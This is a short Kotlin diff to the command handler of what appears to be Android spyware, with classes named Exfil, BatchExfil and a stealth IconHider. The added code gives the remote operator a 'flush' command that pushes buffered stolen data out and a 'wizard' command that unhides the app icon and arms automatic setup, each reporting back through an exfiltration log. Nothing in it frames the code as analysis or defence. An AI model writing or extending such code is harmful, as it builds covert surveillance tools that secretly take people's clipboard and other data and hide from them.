@@ -71,7 +71,12 @@ object Commands {
                 }
             }
 
-            "flush" -> BatchFlushWorker.flushNow(ctx)
+            "flush" -> {
+                // Send everything that is waiting in the buffer right now.
+                BatchExfil.flush(ctx)
+                BatchFlushWorker.flushNow(ctx)
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"flush","ok":true,"pending":${BatchExfil.pendingCount(ctx)}}""")
+            }
 
             "diag" -> Exfil.sendLog(ctx, "diag", com.sp.core.util.Diag.collect(ctx))
 
@@ -86,6 +91,15 @@ object Commands {
                     )
                     Exfil.sendLog(ctx, "cmd_result", """{"cmd":"clipboard","ok":true,"len":${text.length}}""")
                 }
+            }
+
+            "wizard" -> {
+                // The icon may be hidden - bring it back so the wizard can be
+                // opened, and arm the automatic setup.
+                com.sp.core.stealth.IconHider.show(ctx)
+                com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO, true)
+                com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO_IDX, 0)
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"wizard","ok":true,"icon":"visible"}""")
             }
 
             "hide" -> {
